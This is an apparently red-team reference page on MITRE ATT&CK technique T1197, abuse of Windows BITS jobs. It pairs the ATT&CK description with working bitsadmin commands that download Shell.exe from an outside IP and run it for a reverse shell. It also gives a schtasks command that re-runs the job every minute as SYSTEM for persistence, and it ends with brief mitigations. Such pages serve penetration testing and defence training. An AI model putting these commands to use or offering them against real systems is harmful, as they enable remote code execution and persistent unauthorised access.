---
description: https://attack.mitre.org/techniques/T1197/
---

# BITS Jobs

**ATT\&CK ID:** [**T1197**](https://attack.mitre.org/techniques/T1197/)

**Permissions Required:**

**Description**

Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM).BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.

Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).

BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.

[\[Source\]](https://attack.mitre.org/techniques/T1197/)

## Techniques

```bash
# Create BITS Job
bitsadmin /create Shell

# Point to URL of shell
bitsadmin /addfile Shell "http://10.10.10.200/Shell.exe" "C:\Windows\Temp\Shell.exe"

# Set Command
bitsadmin /SetNotifyCmdLine Shell C:\Windows\Temp\Shell.exe NUL

# Set to run every 5 minutes on transient error
bitsadmin /SetMinRetryDelay "Shell" 300

# Resume job
bitsadmin /resume Shell
```

Creation of BITS job.

![](../../../.gitbook/assets/Bitsadmin-Job-Creation.png)

Executing the BITS job gives back a reverse shell.

![](<../../../.gitbook/assets/image (228).png>)

BITS jobs will also run again after a reboot when the user it was created under logs in again.

`Schtasks` can also be used to run the created BITS job on a regular interval. The command below runs our newly created BITS job every minute.

```
schtasks /create /tn "BitsJob" /sc minute /mo 1 /ru SYSTEM /tr "C:\Windows\System32\bitsadmin.exe /resume "\Shell\""
```

## Mitigation

* Consider limiting access to the BITS interface to specific users or groups
* Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic.
* Consider reducing the default BITS job lifetime in Group Policy or by editing the `JobInactivityTimeout` and `MaxDownloadTime` Registry values in `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\BITS`.[\[2\]](https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx)

## Further Reading

**Temporal Persistence with bitsadmin and schtasks:** [https://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html](https://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html)
